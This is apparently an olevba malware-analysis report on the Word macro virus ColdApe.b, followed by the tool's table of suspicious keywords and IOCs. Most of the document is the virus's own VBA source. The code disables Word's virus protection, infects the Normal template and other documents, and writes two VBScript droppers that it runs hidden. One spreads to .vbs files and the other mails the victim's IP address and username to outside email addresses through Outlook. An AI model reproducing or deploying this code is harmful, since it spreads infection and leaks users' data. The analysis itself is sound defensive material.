olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.ColdApe.b-2d5962aafb8750d4dafd73101f414014748b6374
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.ColdApe.b-2d5962aafb8750d4dafd73101f414014748b6374 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'AVM
On Error Resume Next
Dim DC, IT As Integer
a = ActiveDocument.Saved
Application.EnableCancelKey = 1 And 0
Options.VirusProtection = 1 And 0
Options.ConfirmConversions = 1 And 0
Options.SaveNormalPrompt = 1 And 0
gen = 36
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "'" & Application.UserName & " Loves Nicky F. Also! " & Now
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
gen = gen + 1
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 10, "gen =" & Str(gen)
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'AVM" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines - 1))
gen = gen + 1
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 10, "gen =" & Str(gen)
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
IT = (Day(Now))
If IT >= 30 Then IT = 0
DC = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC")
If DC = "" Or DC < IT Or IT = 0 Then
GoOk = True
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-DC") = IT
End If
TestCon = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS")
If System.PrivateProfileString("", "HKEY_CLASSES_ROOT\VBSFile\ScriptEngine", "") = "VBScript" Then SIY = True
If SIY = True And TestCon <> "Done" Then
Open "c:\happy.vbs" For Output As 1
Print #1, "'§"
Print #1, ""
Print #1, "On Error Resume Next"
Print #1, "Dim IV6, U187, IV7, IV1, IV2, IV3, IV4"
Print #1, "Dim T111"
Print #1, "Dim IV5(200)"
Print #1, "Dim XR"
Print #1, "Set WSHShell = Wscript.CreateObject(""Wscript.Shell"")"
Print #1, "Set WshSysEnv = WSHShell.Environment(""Process"")"
Print #1, "IV10 = WshSysEnv(""Path"")"
Print #1, "IV7 = WSHShell.ExpandEnvironmentStrings(""%windir%\avm.vbs"")"
Print #1, "IV1 = Wscript.ScriptFullName"
Print #1, "Set IV6 = CreateObject(""Scripting.FileSystemObject"")"
Print #1, "XR = 1"
Print #1, "T11 = Wscript.ScriptFullName"
Print #1, "For x = Len(IV10) To 1 Step -1"
Print #1, "IV4 = Mid(IV10, x, 1)"
Print #1, "If IV4 <> "";"" Then"
Print #1, "IV5(XR) = IV4 + IV5(XR)"
Print #1, "ElseIf IV4 = "";"" Then"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "XR = XR + 1"
Print #1, "End If"
Print #1, "Next"
Print #1, "IV5(XR) = IV5(XR) + ""\"""
Print #1, "IV5(XR + 1) = WSHShell.SpecialFolders(""Desktop"") + ""\"""
Print #1, "IV5(XR + 2) = WSHShell.SpecialFolders(""MyDocuments"") + ""\"""
Print #1, "IV5(XR + 3) = WSHShell.SpecialFolders(""Startup"") + ""\"""
Print #1, "IV5(XR + 4) = Left(T11, InStrRev(T11, ""\""))"
Print #1, "Set TS = IV6.OpenTextFile(T11, 1)"
Print #1, "IV9 = TS.ReadAll"
Print #1, "TS.Close"
Print #1, "IV8 = Chr(167)"
Print #1, "endIV8 = ""'"" & IV8"
Print #1, "For x = Len(IV9) To 1 Step -1"
Print #1, "If Mid(IV9, x, 1) = IV8 Then"
Print #1, "x = 1"
Print #1, "IV3 = endIV8 + IV3"
Print #1, "ElseIf Mid(IV9, x, 1) <> IV8 Then"
Print #1, "IV3 = Mid(IV9, x, 1) + IV3"
Print #1, "End If"
Print #1, "Next"
Print #1, "For y = 1 To (XR + 4)"
Print #1, "For Each Target In IV6.GetFolder(IV5(y)).Files"
Print #1, "If UCase(Right(Target.Name, 3)) = ""VBS"" Then"
Print #1, "IV11 = """""
Print #1, "Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)"
Print #1, "IV11 = TS.ReadAll"
Print #1, "TS.Close"
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
'
Print #1, "T111 = True"
Print #1, "Else"
Print #1, "T111 = False"
Print #1, "End If"
Print #1, "End Function"
Print #1, "' Nick ""The Love Monkey"" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
Print #1, "'Ґ"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "AVM-VBS") = "Done"
Close 1
Shell "wscript c:\happy.vbs", vbHide
End If
If SIY = True And GoOk = True Then
If Dir("c:\A4.vbs") = "" Then
Open "c:\A4.vbs" For Output As 1
Print #1, "Dim theApp, theNameSpace, theMailItem"
Print #1, "Dim IPSocket"
Print #1, "On Error Resume Next"
Print #1, "Set IPSocket = CreateObject(""MSWinsock.Winsock"")"
Print #1, "IPADDY = IPSocket.LocalIP"
Print #1, "set BOB = CreateObject(""Wscript.Network"")"
Print #1, "For x = 1 To 2"
Print #1, "If x = 1 Then EMADDY = ""avm@redneck.efga.org"" Else EMADDY = ""nick@virusbtn.com"""
Print #1, "if x = 1 then MSGBDY = IPADDY & " & Chr(34) & Str(gen) & " " & Now & Chr(34) & " else MSGBDY = ""Dear Nicky... my name is " & Application.UserName & " and I want to make hot monkey love with you. You anti-virus stud!"""
Print #1, "Set theApp = WScript.CreateObject(""Outlook.Application"")"
Print #1, "Set theNameSpace = theApp.GetNameSpace(""MAPI"")"
Print #1, "theNameSpace.Logon ""profile"", ""password"""
Print #1, "Set theMailItem = theApp.CreateItem(0)"
Print #1, "theMailItem.Recipients.Add EMADDY"
Print #1, "theMailItem.Subject = BOB.Username"
Print #1, "theMailItem.Body = MSGBDY"
Print #1, "theMailItem.Send"
Print #1, "theNameSpace.Logoff"
Print #1, "Next"
Close 1
End If
Shell "wscript c:\a4.vbs", vbHide
End If
If ActiveDocument.Saved <> a Then ActiveDocument.Saved = a
' Nick "The Love Monkey" v2 Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia
'Hugh G. Rection Loves Nicky F. Also! 11/14/98 10:56:30 AM
'Sylvio Proulx Loves Nicky F. Also! 11/23/98 8:45:13 PM
'yosh Loves Nicky F. Also! 11/12/98 7:03:01
'MOONEY Loves Nicky F. Also! 1/03/99 19:35:22
End Sub
Private Sub Document_New()

'BoormaG Loves Nicky F. Also! 15/03/1999 7:38:47 AM
'RossitD Loves Nicky F. Also! 16/03/1999 9:51:33 AM
'Therese Rusell Loves Nicky F. Also! 16/03/1999 15:46:29
'SmithDi Loves Nicky F. Also! 18/03/1999 8:47:59 AM
'KearnsB Loves Nicky F. Also! 13/04/1999 2:29:45 PM
'DunneJ Loves Nicky F. Also! 19/04/99 8:48:09
'Anthony Gao Loves Nicky F. Also! 28/04/1999 15:15:56
'U004006 Loves Nicky F. Also! 30/04/1999 15:07:51
'Westpac Banking Corporation Loves Nicky F. Also! 06/05/1999 13:29:30
'WBC Loves Nicky F. Also! 07/05/1999 8:14:06
'Sharon Hawkins Loves Nicky F. Also! 20/05/1999 9:33:10
'Markus Schmall Loves Nicky F. Also! 6/4/99 2:59:06 PM
'MACRO Loves Nicky F. Also! 10/19/2099 6:22:17 PM
'xLock Loves Nicky F. Also! 08.04.05 12:55:03
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|ExpandEnvironmentStr|May read system environment variables        |
|          |ings                |                                             |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |happy.vbs           |Executable file name                         |
|IOC       |avm.vbs             |Executable file name                         |
|IOC       |A4.vbs              |Executable file name                         |
|IOC       |a4.vbs              |Executable file name                         |
+----------+--------------------+---------------------------------------------+
